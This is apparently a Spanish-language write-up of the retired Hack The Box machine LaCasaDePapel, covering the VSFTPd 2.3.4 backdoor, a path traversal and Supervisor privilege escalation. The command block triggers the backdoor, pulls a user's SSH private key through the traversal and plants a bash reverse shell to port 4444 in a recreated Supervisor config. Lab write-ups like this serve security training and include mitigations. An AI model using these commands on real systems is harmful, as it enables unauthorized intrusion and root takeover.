---
machine: LaCasaDePapel
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, vsftpd, backdoor, ftps, supervisor]
---

# LaCasaDePapel — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

VSFTPd 2.3.4 incluye la puerta trasera que abre un shell en el puerto `6200`. El acceso al sitio privado con certificado de cliente y un traversal lleva a SSH. Un proceso de Supervisor ejecuta una configuración en un directorio controlable, y aunque el archivo no se pueda editar, se puede borrar y recrear.

## Reconocimiento

```bash
nmap -Pn -sCV -p21,22,80,443,6200 <IP>
ftp <IP>
# USER user:)
# PASS x
nc <IP> 6200
openssl s_client -connect <IP>:443 -cert client.crt -key client.key
curl -k --cert client.crt --key client.key "https://<IP>/private/../../../../home/<USER>/.ssh/id_rsa"
# Supervisor
ls -la /home/<USER>/config/
rm /home/<USER>/config/supervisord.conf
printf '[program:x]\ncommand=/bin/bash -c "bash -i >& /dev/tcp/<IP>/4444 0>&1"\n' > /home/<USER>/config/supervisord.conf
```

## Enumeración

- VSFTPd 2.3.4 y FTPS con certificado de cliente.
- Sitio privado con descargas y un traversal de rutas.
- Supervisor con un archivo de configuración en un directorio del usuario.

## Acceso inicial

El backdoor de VSFTPd se activa al enviar `USER` con `:)` y abre una consola Psy en `6200`. Se obtiene una shell de PHP; el certificado de cliente permite entrar al sitio privado y un traversal descarga la clave SSH.

## Escalada de privilegios

Supervisor de root lee un archivo de configuración dentro de un directorio controlado por el usuario. Aunque el archivo pertenece a root, se puede borrar y recrear con un comando que se ejecute como root.

## Evidencia

- Puerto `6200` abierto tras el intento FTP.
- Consola Psy y clave SSH obtenida.
- Configuración de Supervisor recreada y shell de root.

## Lecciones aprendidas

- Los backdoors conocidos siguen en servicios sin actualizar.
- Los certificados de cliente no sustituyen la autorización por ruta.
- Los permisos del directorio pueden importar más que los del archivo.

## Mitigación y detección

- Actualizar VSFTPd y eliminar versiones con backdoor.
- Validar rutas y no confiar solo en el certificado.
- Montar configuraciones de Supervisor como solo lectura y en directorios no escribibles.

## Referencias

- [0xdf — LaCasaDePapel](https://0xdf.gitlab.io/2019/07/27/htb-lacasadepapel.html)
- [Supervisor — Configuration](http://supervisord.org/configuration.html)
- [Hack The Box — LaCasaDePapel](https://app.hackthebox.com/machines/lacasadepapel)
